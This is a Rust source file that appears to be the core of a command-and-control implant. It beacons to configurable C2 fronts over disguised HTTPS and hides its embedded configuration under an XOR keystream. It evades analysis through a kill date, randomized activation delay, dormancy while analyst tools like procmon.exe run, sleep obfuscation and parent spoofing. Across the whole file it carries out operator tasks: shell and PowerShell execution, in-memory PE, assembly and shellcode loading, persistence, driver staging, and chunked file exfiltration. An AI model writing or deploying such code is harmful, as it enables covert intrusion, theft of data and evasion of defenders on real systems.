use abraham_common::crypto::{self, ClientHello, Session};
use abraham_common::frame::open_frames;
use abraham_common::http::{read_response, write_request, HDR_HANDSHAKE};
use abraham_common::message::{
    self, msg, Chunk, Message, RegisterInfo, Task, TaskBody, TaskResult,
};
use abraham_common::profile::Profile;
use ed25519_dalek::VerifyingKey;
use sha2::{Digest, Sha256};
#[cfg(feature = "lab-args")]
use std::path::Path;
use std::time::Duration;
use tokio::io::{AsyncRead, AsyncWrite};
use tokio::net::TcpStream;

mod clr;
mod driver;
mod runpe;
/// Operational configuration baked in at build time (ABRAHAM_EMBED) —
/// empty arrays in lab builds, which read flags instead (feature
/// `lab-args`). Keeping the CLI parser feature-gated removes the flag
/// strings and, more importantly, the command-line surface itself from
/// operational artifacts: Sysmon EID 1 never sees server, key or
/// evasion state.
mod embedded_config {
    include!(concat!(env!("OUT_DIR"), "/embedded.rs"));
}
mod evasion;
mod execshc;
mod mapper;
mod modules;
mod persist;
mod selfinfo;
mod vdm;

use evasion::{note, secure_clear};

const CHUNK_SIZE: usize = 60_000;
/// Reconnect backoff: starts at MIN after a session that reached the
/// beacon loop, doubles per consecutive failure up to MAX, with jitter.
/// A fixed retry interval is a mechanical beacon signature; this keeps
/// the failure pattern indistinguishable from a polling client.
const RECONNECT_MIN_SECS: u64 = 5;
const RECONNECT_MAX_SECS: u64 = 300;
/// Consecutive transport failures before rotating to the next
/// configured front (T035 failover).
const FAILOVER_AFTER: u32 = 3;
/// Upper bound for one HTTP request/response exchange. Cover transports
/// behind proxies (CDN edges, redirectors) may silently drop a connection
/// while the local socket still reports it established; without a bound
/// the beacon blocks forever on a read that never returns.
const POST_TIMEOUT: Duration = Duration::from_secs(30);

/// Environment gates evaluated before first contact (T035): a random
/// activation delay breaks the "process start → immediate HTTPS beacon"
/// correlation, and a blocked-process list keeps the implant dormant on
/// analyst/EDR workstations (SUNBURST-style environment check).
#[derive(Debug, Default, Clone, serde::Deserialize)]
struct Gates {
    #[serde(default)]
    initial_delay_max_secs: u64,
    #[serde(default)]
    blocked_processes: Vec<String>,
}

/// Everything the beacon loop needs, resolved once at startup from
/// either the embedded build configuration or (lab builds) the flags.
struct Config {
    /// C2 front addresses ("host:port") in priority order; the loop
    /// fails over to the next after repeated consecutive failures.
    servers: Vec<String>,
    key_hex: String,
    tls_pin_hex: Option<String>,
    evasion_spec: String,
    profile: Profile,
    /// Unix timestamp after which the implant exits silently (0 = off).
    kill_date: u64,
    gates: Gates,
}

#[cfg(feature = "lab-args")]
fn arg_or(flag: &str, default: &str) -> String {
    let args: Vec<String> = std::env::args().collect();
    args.iter()
        .position(|a| a == flag)
        .and_then(|i| args.get(i + 1))
        .cloned()
        .unwrap_or_else(|| default.to_string())
}

#[cfg(feature = "lab-args")]
fn arg_opt(flag: &str) -> Option<String> {
    let args: Vec<String> = std::env::args().collect();
    args.iter()
        .position(|a| a == flag)
        .and_then(|i| args.get(i + 1))
        .cloned()
}

/// Decodes the embedded configuration (see build.rs for the layout:
/// one u32-length-prefixed JSON blob under a build-random XOR
/// keystream).
fn decode_embedded() -> Option<Config> {
    // Every byte is read through `read_volatile`: with LTO the optimizer
    // would otherwise constant-fold the whole XOR and materialize the
    // plaintext as a `.rdata` constant, defeating the keystream.
    let cipher_len = unsafe { std::ptr::read_volatile(&embedded_config::CONFIG_CIPHER.len()) };
    if cipher_len < 4 {
        return None;
    }
    let cipher_ptr = embedded_config::CONFIG_CIPHER.as_ptr();
    let key_ptr = embedded_config::CONFIG_KEY.as_ptr();
    let key_len = embedded_config::CONFIG_KEY.len();
    let mut plain = vec![0u8; cipher_len];
    for (i, slot) in plain.iter_mut().enumerate() {
        let c = unsafe { std::ptr::read_volatile(cipher_ptr.add(i)) };
        let k = if i < key_len {
            unsafe { std::ptr::read_volatile(key_ptr.add(i)) }
        } else {
            0
        };
        *slot = c ^ k;
    }
    let blob_len = u32::from_be_bytes([plain[0], plain[1], plain[2], plain[3]]) as usize;
    let embedded: Option<serde_json::Value> = if 4 + blob_len <= plain.len() {
        serde_json::from_slice(&plain[4..4 + blob_len]).ok()
    } else {
        None
    };
    secure_clear(&mut plain);
    parse_embedded_json(embedded?)
}

/// Parses the decoded embed JSON into a [`Config`]; separated from the
/// XOR plumbing so the schema (servers, legacy alias, gates) is
/// unit-testable without a build-time blob.
fn parse_embedded_json(json: serde_json::Value) -> Option<Config> {
    let str_field = |name: &str| -> String {
        json.get(name)
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string()
    };
    let mut servers: Vec<String> = json
        .get("servers")
        .and_then(|v| v.as_array())
        .map(|list| {
            list.iter()
                .filter_map(|v| v.as_str())
                .filter(|s| !s.is_empty())
                .map(str::to_string)
                .collect()
        })
        .unwrap_or_default();
    // Legacy single-server alias.
    if servers.is_empty() {
        let server = str_field("server");
        if !server.is_empty() {
            servers.push(server);
        }
    }
    if servers.is_empty() {
        return None;
    }
    let key_hex = str_field("key");
    if key_hex.is_empty() {
        return None;
    }
    let profile_text = str_field("profile");
    let profile = if profile_text.is_empty() {
        Profile::default()
    } else {
        Profile::load(&profile_text).unwrap_or_default()
    };
    let tls_pin_hex = if str_field("tls_pin").is_empty() {
        None
    } else {
        Some(str_field("tls_pin"))
    };
    Some(Config {
        servers,
        key_hex,
        tls_pin_hex,
        evasion_spec: str_field("evasion"),
        profile,
        kill_date: json.get("kill_date").and_then(|v| v.as_u64()).unwrap_or(0),
        gates: json
            .get("gates")
            .cloned()
            .and_then(|g| serde_json::from_value(g).ok())
            .unwrap_or_default(),
    })
}

/// Wall-clock seconds since the Unix epoch (kill-date arithmetic).
fn now_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

fn collect_info(session_token: u64) -> RegisterInfo {
    let env = |key: &str| std::env::var(key).unwrap_or_default();
    RegisterInfo {
        session_token,
        hostname: env("COMPUTERNAME"),
        username: env("USERNAME"),
        domain: env("USERDOMAIN"),
        pid: std::process::id(),
        ppid: selfinfo::ppid().unwrap_or(0),
        arch: if cfg!(target_arch = "x86_64") {
            message::ARCH_X64
        } else {
            message::ARCH_ARM64
        },
        integrity_level: selfinfo::integrity().unwrap_or(0),
        os_build: selfinfo::os_build().unwrap_or_default(),
        implant_version: env!("CARGO_PKG_VERSION").to_string(),
    }
}

/// Beacon timing, updatable at runtime by the SLEEP task.
struct Timing {
    secs: u64,
    jitter: f32,
}

fn jittered(secs: u64, jitter: f32) -> Duration {
    let factor = 1.0 + jitter * (2.0 * rand::random::<f32>() - 1.0);
    let wait = (secs as f32 * factor).max(0.5) as u64;
    Duration::from_secs(wait)
}

struct HttpConn<S> {
    stream: S,
    host: String,
    user_agent: String,
    /// Precomputed `Cookie: <profile.cookie_name>=<token>` header sent
    /// on every POST (T035): a session cookie is what web-fronted
    /// traffic normally carries, a custom X-Session header is not. The
    /// ClientHello POST additionally carries X-Handshake: 1 so the
    /// teamserver can tell it from a frame request before any cookie
    /// routing happens.
    cookie: String,
}

impl<S: AsyncRead + AsyncWrite + Unpin> HttpConn<S> {
    async fn post(&mut self, uri: &str, hello: bool, body: Vec<u8>) -> anyhow::Result<Vec<u8>> {
        // A proxy or middlebox can strand the transport half-open: writes
        // drain into the local socket buffer while the response read never
        // completes. Bound every request/response exchange so the beacon
        // drops the connection and re-links (resuming its session) instead
        // of going silent for the lifetime of the process.
        let headers: &[(&str, &str)] = if hello {
            &[(HDR_HANDSHAKE, "1"), ("Cookie", &self.cookie)]
        } else {
            &[("Cookie", &self.cookie)]
        };
        let exchange = async {
            write_request(
                &mut self.stream,
                "POST",
                uri,
                &self.host,
                &self.user_agent,
                headers,
                &body,
            )
            .await?;
            let resp = read_response(&mut self.stream).await?;
            // 204 = empty poll from a 0.2.0+ teamserver: nothing sealed,
            // nothing to open; any other status is a transport error.
            if resp.status != 200 && resp.status != 204 {
                anyhow::bail!("server returned http {}", resp.status);
            }
            Ok(resp.body)
        };
        tokio::time::timeout(POST_TIMEOUT, exchange)
            .await
            .map_err(|_| anyhow::anyhow!("http exchange timed out"))?
    }

    /// Posts one sealed frame and decrypts any frames in the response so the
    /// receive counter stays in lockstep with the server.
    async fn post_frame(
        &mut self,
        uri: &str,
        session: &mut Session,
        msg_type: u8,
        plaintext: &[u8],
    ) -> anyhow::Result<Vec<(u8, Vec<u8>)>> {
        let frame = session.seal(msg_type, plaintext)?;
        let body = self.post(uri, false, frame).await?;
        Ok(open_frames(&body, session)?)
    }
}

// Single-threaded runtime: sleep obfuscation encrypts the whole image, so
// no other thread may execute implant code while the session thread sleeps.
#[tokio::main(flavor = "current_thread")]
async fn main() -> anyhow::Result<()> {
    // Silent panics: operational builds (panic=abort) terminate without
    // printing locations, sources or toolchain paths.
    std::panic::set_hook(Box::new(|_| {}));

    let config = resolve_config()?;
    let mut public_key = [0u8; 32];
    hex::decode_to_slice(config.key_hex.trim(), &mut public_key)?;
    let identity = VerifyingKey::from_bytes(&public_key)?;

    let pin = match &config.tls_pin_hex {
        Some(text) => {
            let mut pin = [0u8; 32];
            hex::decode_to_slice(text.trim(), &mut pin)?;
            Some(pin)
        }
        None => None,
    };

    let profile = config.profile.clone();
    #[cfg(feature = "lab-args")]
    let profile = {
        let mut profile = profile;
        if let Some(ua) = arg_opt("--ua") {
            profile.user_agent = ua;
        }
        if let Some(uri) = arg_opt("--uri") {
            profile.uris = vec![uri];
        }
        profile
    };
    // `mut` is only exercised by lab builds (--sleep/--jitter overrides).
    #[cfg_attr(not(feature = "lab-args"), allow(unused_mut))]
    let mut timing = Timing {
        secs: profile.sleep_secs,
        jitter: profile.jitter,
    };
    #[cfg(feature = "lab-args")]
    if arg_opt("--sleep").is_some() || arg_opt("--jitter").is_some() {
        timing.secs = arg_opt("--sleep")
            .map(|v| v.parse::<u64>())
            .transpose()?
            .unwrap_or(timing.secs);
        timing.jitter = arg_opt("--jitter")
            .map(|v| v.parse::<f32>())
            .transpose()?
            .unwrap_or(timing.jitter);
    }

    let evasion_spec = config.evasion_spec.clone();
    let evasion = if evasion_spec.is_empty() {
        evasion::Evasion::disabled()
    } else {
        let flags = evasion::Flags::parse(&evasion_spec).map_err(anyhow::Error::msg)?;
        let armed = evasion::Evasion::enable(flags).map_err(anyhow::Error::msg)?;
        note!(
            "[*] evasion armed: sleep={} parent-spoof={}",
            flags.ekko_sleep,
            flags.spoofed_parent
        );
        armed
    };

    // Stable across reconnects within this process: the server resumes
    // the session (id + queue) when the transport dies behind a proxy.
    let mut beacon = Beacon {
        token: rand::random(),
        timing,
    };

    // Kill date (T035): a build stamped with an expiry exits silently
    // once past it — dead tooling must not keep beaconing (and lab
    // implants eventually clean themselves up).
    if config.kill_date != 0 && now_secs() > config.kill_date {
        return Ok(());
    }

    // Environment gates (T035): random activation delay before FIRST
    // contact (breaks process-start → immediate-beacon correlation),
    // and dormancy while a blocked process (analyst tooling) is running.
    if config.gates.initial_delay_max_secs > 0 {
        let delay = rand::random::<u64>() % config.gates.initial_delay_max_secs.max(1);
        if delay > 0 {
            tokio::time::sleep(Duration::from_secs(delay)).await;
        }
        if config.kill_date != 0 && now_secs() > config.kill_date {
            return Ok(());
        }
    }

    let mut server_idx = 0usize;
    let mut consecutive_failures = 0u32;
    let mut backoff = RECONNECT_MIN_SECS;
    loop {
        if !config.gates.blocked_processes.is_empty()
            && modules::any_process_running(&config.gates.blocked_processes)
        {
            // Dormant while the environment is hostile: re-check after
            // a full backoff window, no contact attempted.
            tokio::time::sleep(jittered(backoff, 0.2)).await;
            continue;
        }
        let mut linked = false;
        match run(
            &config.servers[server_idx],
            &identity,
            &profile,
            pin,
            &evasion,
            &mut beacon,
            &mut linked,
        )
        .await
        {
            Ok(()) => return Ok(()),
            Err(e) => {
                note!("[!] session ended: {e}; retrying in {backoff}s");
                // `e` is only referenced through note! (lab-log builds).
                let _ = &e;
                consecutive_failures += 1;
                // Failover (T035): rotate to the next configured front
                // after repeated consecutive failures — a seized primary
                // domain must not strand implants that have a backup.
                if consecutive_failures >= FAILOVER_AFTER && config.servers.len() > 1 {
                    server_idx = (server_idx + 1) % config.servers.len();
                    consecutive_failures = 0;
                    note!("[*] failing over to {}", config.servers[server_idx]);
                }
            }
        }
        if config.kill_date != 0 && now_secs() > config.kill_date {
            return Ok(());
        }
        tokio::time::sleep(jittered(backoff, 0.2)).await;
        backoff = if linked {
            RECONNECT_MIN_SECS
        } else {
            (backoff * 2).min(RECONNECT_MAX_SECS)
        };
    }
}

/// Per-process beacon state that survives transports: the resume token
/// and the (SLEEP-task adjustable) polling timing.
struct Beacon {
    token: u64,
    timing: Timing,
}

/// Configuration precedence: CLI flags (lab builds only), then the
/// embedded build configuration, then fail closed — no localhost
/// default to silently beacon against.
fn resolve_config() -> anyhow::Result<Config> {
    #[cfg(feature = "lab-args")]
    {
        let server = arg_or("--server", "");
        let key_hex = arg_or("--key", "");
        if !server.is_empty() && !key_hex.is_empty() {
            let mut profile = match arg_opt("--profile") {
                Some(path) => Profile::load_file(Path::new(&path)).map_err(anyhow::Error::msg)?,
                None => Profile::default(),
            };
            if let Some(uri) = arg_opt("--uri") {
                profile.uris = vec![uri];
            }
            if let Some(ua) = arg_opt("--ua") {
                profile.user_agent = ua;
            }
            return Ok(Config {
                servers: vec![server],
                key_hex,
                tls_pin_hex: arg_opt("--tls-pin"),
                evasion_spec: arg_or("--evasion", ""),
                profile,
                kill_date: 0,
                gates: Gates::default(),
            });
        }
    }
    if let Some(embedded) = decode_embedded() {
        return Ok(embedded);
    }
    anyhow::bail!("no configuration");
}

async fn run(
    addr: &str,
    identity: &VerifyingKey,
    profile: &Profile,
    pin: Option<[u8; 32]>,
    evasion: &evasion::Evasion,
    beacon: &mut Beacon,
    linked: &mut bool,
) -> anyhow::Result<()> {
    let (host, _port) = addr
        .split_once(':')
        .ok_or_else(|| anyhow::anyhow!("server address must be host:port"))?;
    let tcp = TcpStream::connect(addr).await?;
    tcp.set_nodelay(true)?;
    // Cover TLS via the platform stack (Schannel on Windows): the
    // handshake fingerprint matches ordinary OS HTTPS traffic. Trust is
    // not decided here — without a pin any certificate completes the
    // outer layer and the inner Ed25519 handshake authenticates the
    // server; with a pin the peer end-entity DER is hashed and enforced
    // before any protocol bytes go out, so a mismatched certificate
    // aborts the connection first.
    let mut tls_builder = native_tls::TlsConnector::builder();
    tls_builder.danger_accept_invalid_certs(true);
    tls_builder.danger_accept_invalid_hostnames(true);
    let connector = tokio_native_tls::TlsConnector::from(tls_builder.build()?);
    let tls = connector.connect(host, tcp).await?;
    if let Some(expected) = pin {
        let cert = tls
            .get_ref()
            .peer_certificate()?
            .ok_or_else(|| anyhow::anyhow!("tls peer sent no certificate"))?;
        let digest: [u8; 32] = Sha256::digest(cert.to_der()?).into();
        if digest != expected {
            anyhow::bail!("tls certificate pin mismatch");
        }
    }
    let mut conn = HttpConn {
        stream: tls,
        host: host.to_string(),
        user_agent: profile.user_agent.clone(),
        cookie: format!("{}={}", profile.cookie_name, beacon.token),
    };

    let (client_secret, client_hello) = ClientHello::generate();
    let hello_body = conn
        .post(profile.pick_uri(), true, client_hello.to_bytes().to_vec())
        .await?;
    let raw_hello: [u8; crypto::SERVER_HELLO_LEN] = hello_body.as_slice().try_into()?;
    let server_hello = crypto::ServerHello::from_bytes(&raw_hello);
    let mut session = crypto::client_finish(identity, client_secret, &client_hello, &server_hello)?;

    let (mt, body) = Message::Register(collect_info(beacon.token)).encode();
    conn.post_frame(profile.pick_uri(), &mut session, mt, &body)
        .await?;
    // Past REGISTER the beacon loop is live — a later failure is a
    // mid-session drop, not a startup failure, so backoff resets.
    *linked = true;

    loop {
        evasion.sleep(jittered(beacon.timing.secs, beacon.timing.jitter));
        let (mt, body) = Message::TaskPoll.encode();
        let frames = conn
            .post_frame(profile.pick_uri(), &mut session, mt, &body)
            .await?;

        let mut pending_upload: Option<(u32, String, Vec<u8>)> = None;
        for (msg_type, mut payload) in frames {
            if msg_type == msg::BATCH_END {
                break;
            }
            match Message::decode(msg_type, &payload)? {
                Message::Task(task) => match task.body {
                    TaskBody::Upload { path } => {
                        pending_upload = Some((task.id, path, Vec::new()));
                    }
                    body => {
                        execute_task(
                            &mut conn,
                            &mut session,
                            profile,
                            evasion,
                            Task { id: task.id, body },
                            &mut beacon.timing,
                        )
                        .await?;
                    }
                },
                Message::Chunk(chunk) => {
                    handle_upload_chunk(
                        &mut conn,
                        &mut session,
                        profile,
                        &mut pending_upload,
                        chunk,
                    )
                    .await?;
                }
                _ => {}
            }
            // The decoded task frame (commands, payloads) leaves nothing
            // behind in the heap once dispatched.
            secure_clear(&mut payload);
        }
    }
}

/// Inline budget for task results. One sealed frame carries at most ~64 KiB
/// of plaintext (u16 length field minus the AEAD tag), so a verbose module
/// output would fail `seal` and take the transport down with it. Larger
/// results are split: a short preview goes inline and the full payload
/// follows as chunked loot, which the server reassembles per task id.
const RESULT_INLINE_MAX: usize = 48_000;
const RESULT_PREVIEW_LEN: usize = 1_900;

/// Largest prefix of `data` (up to `cap`) that ends on a UTF-8 boundary:
/// walk back while the byte after the cut is a continuation byte.
fn utf8_prefix(data: &[u8], cap: usize) -> usize {
    let mut end = cap.min(data.len());
    while end > 0 && end < data.len() && (data[end] & 0xC0) == 0x80 {
        end -= 1;
    }
    end
}

async fn send_result<S: AsyncRead + AsyncWrite + Unpin>(
    conn: &mut HttpConn<S>,
    session: &mut Session,
    profile: &Profile,
    mut result: TaskResult,
) -> anyhow::Result<()> {
    if result.data.len() > RESULT_INLINE_MAX {
        let total = result.data.len();
        let mut preview = result.data[..utf8_prefix(&result.data, RESULT_PREVIEW_LEN)].to_vec();
        preview.extend_from_slice(
            format!("\n[...] {total} bytes total; full output follows as chunked loot\n")
                .as_bytes(),
        );
        let inline = TaskResult {
            id: result.id,
            status: result.status,
            data: preview,
        };
        let (mt, body) = Message::TaskResult(inline).encode();
        conn.post_frame(profile.pick_uri(), session, mt, &body)
            .await?;
        send_chunks(conn, session, profile, result.id, &result.data).await?;
        secure_clear(&mut result.data);
        return Ok(());
    }
    let (mt, body) = Message::TaskResult(result).encode();
    conn.post_frame(profile.pick_uri(), session, mt, &body)
        .await?;
    Ok(())
}

async fn send_chunks<S: AsyncRead + AsyncWrite + Unpin>(
    conn: &mut HttpConn<S>,
    session: &mut Session,
    profile: &Profile,
    task_id: u32,
    data: &[u8],
) -> anyhow::Result<()> {
    let mut body = Vec::new();
    if data.is_empty() {
        let (mt, encoded) = Message::Chunk(Chunk {
            task_id,
            seq: 0,
            data: Vec::new(),
            last: true,
        })
        .encode();
        body.extend_from_slice(&session.seal(mt, &encoded)?);
    } else {
        let total = data.len().div_ceil(CHUNK_SIZE);
        for (seq, part) in data.chunks(CHUNK_SIZE).enumerate() {
            let (mt, encoded) = Message::Chunk(Chunk {
                task_id,
                seq: seq as u32,
                data: part.to_vec(),
                last: seq + 1 == total,
            })
            .encode();
            body.extend_from_slice(&session.seal(mt, &encoded)?);
        }
    }
    conn.post(profile.pick_uri(), false, body).await?;
    Ok(())
}

async fn handle_upload_chunk<S: AsyncRead + AsyncWrite + Unpin>(
    conn: &mut HttpConn<S>,
    session: &mut Session,
    profile: &Profile,
    pending: &mut Option<(u32, String, Vec<u8>)>,
    chunk: Chunk,
) -> anyhow::Result<()> {
    let Some((_, _, data)) = pending.as_mut() else {
        return Ok(());
    };
    data.extend_from_slice(&chunk.data);
    if !chunk.last {
        return Ok(());
    }
    let Some((task_id, path, mut data)) = pending.take() else {
        return Ok(());
    };
    let (status, message) = match std::fs::write(&path, &data) {
        Ok(()) => (
            message::STATUS_OK,
            format!("wrote {} bytes to {path}", data.len()),
        ),
        Err(e) => (
            message::STATUS_ERROR,
            format!("failed to write {path}: {e}"),
        ),
    };
    secure_clear(&mut data);
    send_result(
        conn,
        session,
        profile,
        TaskResult {
            id: task_id,
            status,
            data: message.into_bytes(),
        },
    )
    .await
}

async fn execute_task<S: AsyncRead + AsyncWrite + Unpin>(
    conn: &mut HttpConn<S>,
    session: &mut Session,
    profile: &Profile,
    evasion: &evasion::Evasion,
    task: Task,
    timing: &mut Timing,
) -> anyhow::Result<()> {
    match task.body {
        TaskBody::Shell { command } => {
            let (status, mut data) = if evasion.spoofed_parent() {
                let (exit, output) = evasion.run_command(&command)?;
                let status = if exit == 0 {
                    message::STATUS_OK
                } else {
                    message::STATUS_ERROR
                };
                (status, output)
            } else {
                // Blocking std::process, deliberately: tokio::process runs
                // on the runtime's background thread pool, and those
                // threads may execute implant code during the ekko
                // encrypted window — the exact single-thread invariant
                // sleep obfuscation relies on (observed as an
                // access violation in the VM lab, 2026-09-11). The
                // session thread blocks here exactly like it already
                // blocks inside evasion.sleep().
                let output = std::process::Command::new("cmd")
                    .args(["/C", &command])
                    .output()?;
                let status = if output.status.success() {
                    message::STATUS_OK
                } else {
                    message::STATUS_ERROR
                };
                let mut data = output.stdout;
                data.extend(&output.stderr);
                (status, data)
            };
            // The command text never outlives its execution.
            let mut command = command;
            secure_clear(unsafe { command.as_mut_vec() });
            send_result(
                conn,
                session,
                profile,
                TaskResult {
                    id: task.id,
                    status,
                    data: data.clone(),
                },
            )
            .await?;
            secure_clear(&mut data);
            Ok(())
        }
        TaskBody::Module { name, args } => {
            let (status, mut data) = match modules::run(&name, &args) {
                Ok(data) => (message::STATUS_OK, data),
                Err(e) => (message::STATUS_ERROR, e.into_bytes()),
            };
            let mut args = args;
            secure_clear(unsafe { args.as_mut_vec() });
            send_result(
                conn,
                session,
                profile,
                TaskResult {
                    id: task.id,
                    status,
                    data: data.clone(),
                },
            )
            .await?;
            secure_clear(&mut data);
            Ok(())
        }
        TaskBody::RunPe { data, path } => {
            let mut data = data;
            let (status, out) = if !data.is_empty() {
                match runpe::run(&data) {
                    Ok(code) => (
                        message::STATUS_OK,
                        format!("runpe: inline {}B exit={code:#x}", data.len()).into_bytes(),
                    ),
                    Err(e) => (message::STATUS_ERROR, e.into_bytes()),
                }
            } else if !path.is_empty() {
                match runpe::run_from_path(&path) {
                    Ok(code) => (
                        message::STATUS_OK,
                        format!("runpe: {path} exit={code:#x} (stage deleted)").into_bytes(),
                    ),
                    Err(e) => (message::STATUS_ERROR, e.into_bytes()),
                }
            } else {
                (
                    message::STATUS_ERROR,
                    b"runpe requires data or path".to_vec(),
                )
            };
            secure_clear(&mut data);
            send_result(
                conn,
                session,
                profile,
                TaskResult {
                    id: task.id,
                    status,
                    data: out,
                },
            )
            .await
        }
        TaskBody::PowerShell { script, bootstrap } => {
            let mut bootstrap = bootstrap;
            let mut script = script;
            let (status, out) = match clr::powershell_run(&script, &bootstrap) {
                Ok(out) => (message::STATUS_OK, out),
                Err(e) => (message::STATUS_ERROR, e.into_bytes()),
            };
            secure_clear(unsafe { script.as_mut_vec() });
            secure_clear(&mut bootstrap);
            send_result(
                conn,
                session,
                profile,
                TaskResult {
                    id: task.id,
                    status,
                    data: out,
                },
            )
            .await
        }
        TaskBody::ExecuteAssembly {
            data,
            type_name,
            method_name,
            argument,
            patch,
        } => {
            let mut data = data;
            let (status, out) =
                match clr::exec_assembly(&data, &type_name, &method_name, &argument, patch != 0) {
                    Ok(out) => (message::STATUS_OK, out),
                    Err(e) => (message::STATUS_ERROR, e.into_bytes()),
                };
            secure_clear(&mut data);
            send_result(
                conn,
                session,
                profile,
                TaskResult {
                    id: task.id,
                    status,
                    data: out,
                },
            )
            .await
        }
        TaskBody::Execute { data } => {
            let mut data = data;
            let len = data.len();
            let (status, out) = match execshc::run(&data) {
                Ok(ret) => (
                    message::STATUS_OK,
                    format!("exec: {len}B ret={ret:#x}").into_bytes(),
                ),
                Err(e) => (message::STATUS_ERROR, e.into_bytes()),
            };
            secure_clear(&mut data);
            send_result(
                conn,
                session,
                profile,
                TaskResult {
                    id: task.id,
                    status,
                    data: out,
                },
            )
            .await
        }
        TaskBody::Persist {
            action,
            mechanism,
            name,
            exe,
            args,
        } => {
            // Host persistence on the session thread (ABR-T030): the
            // registry/SCM calls are blocking, same as the driver arm.
            let (status, data) = match persist::stage(action, &mechanism, &name, &exe, &args) {
                Ok(data) => (message::STATUS_OK, data),
                Err(e) => (message::STATUS_ERROR, e.into_bytes()),
            };
            send_result(
                conn,
                session,
                profile,
                TaskResult {
                    id: task.id,
                    status,
                    data,
                },
            )
            .await
        }
        TaskBody::Driver {
            action,
            service,
            source,
            drop_path,
        } => {
            // Blocking SCM lifecycle on the session thread (ABR-T013),
            // same single-thread rationale as the module arm.
            let (status, data) = match driver::stage(action, &service, &source, &drop_path) {
                Ok(data) => (message::STATUS_OK, data),
                Err(e) => (message::STATUS_ERROR, e.into_bytes()),
            };
            send_result(
                conn,
                session,
                profile,
                TaskResult {
                    id: task.id,
                    status,
                    data,
                },
            )
            .await
        }
        TaskBody::Download { path } => {
            // std::fs for the same single-thread reason as shell tasks:
            // tokio::fs hops to the blocking pool, which must never run
            // implant code mid-ekko-window.
            let mut data = std::fs::read(&path)?;
            send_chunks(conn, session, profile, task.id, &data).await?;
            secure_clear(&mut data);
            send_result(
                conn,
                session,
                profile,
                TaskResult {
                    id: task.id,
                    status: message::STATUS_OK,
                    data: path.into_bytes(),
                },
            )
            .await
        }
        TaskBody::Sleep { secs, jitter: j } => {
            timing.secs = secs;
            timing.jitter = j;
            send_result(
                conn,
                session,
                profile,
                TaskResult {
                    id: task.id,
                    status: message::STATUS_OK,
                    data: format!("sleep updated to {secs}s with jitter {}", j).into_bytes(),
                },
            )
            .await
        }
        TaskBody::Exit => {
            send_result(
                conn,
                session,
                profile,
                TaskResult {
                    id: task.id,
                    status: message::STATUS_OK,
                    data: b"bye".to_vec(),
                },
            )
            .await?;
            std::process::exit(0);
        }
        TaskBody::Upload { .. } => Ok(()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn embed_json_full_schema() {
        let json = serde_json::json!({
            "servers": ["a.example:443", "b.example:443"],
            "key": "11".repeat(32),
            "tls_pin": "",
            "evasion": "ekko",
            "profile": "sleep_secs: 9\njitter: 0.4\n",
            "kill_date": 1_900_000_000,
            "gates": {"initial_delay_max_secs": 60, "blocked_processes": ["procmon.exe"]}
        });
        let config = parse_embedded_json(json).unwrap();
        assert_eq!(config.servers.len(), 2);
        assert_eq!(config.servers[1], "b.example:443");
        assert_eq!(config.profile.sleep_secs, 9);
        assert!(config.tls_pin_hex.is_none());
        assert_eq!(config.kill_date, 1_900_000_000);
        assert_eq!(config.gates.initial_delay_max_secs, 60);
        assert_eq!(config.gates.blocked_processes, vec!["procmon.exe"]);
    }

    #[test]
    fn embed_json_legacy_server_alias() {
        let json = serde_json::json!({"server": "c2.example:443", "key": "ab".repeat(32)});
        let config = parse_embedded_json(json).unwrap();
        assert_eq!(config.servers, vec!["c2.example:443".to_string()]);
        assert_eq!(config.kill_date, 0);
        assert!(config.gates.blocked_processes.is_empty());
        assert_eq!(config.profile.sleep_secs, Profile::default().sleep_secs);
    }

    #[test]
    fn embed_json_rejects_missing_servers_or_key() {
        assert!(parse_embedded_json(serde_json::json!({"key": "x"})).is_none());
        assert!(parse_embedded_json(serde_json::json!({"servers": []})).is_none());
        // No key alongside a server list.
        assert!(parse_embedded_json(serde_json::json!({"servers": ["a:443"]})).is_none());
    }
}
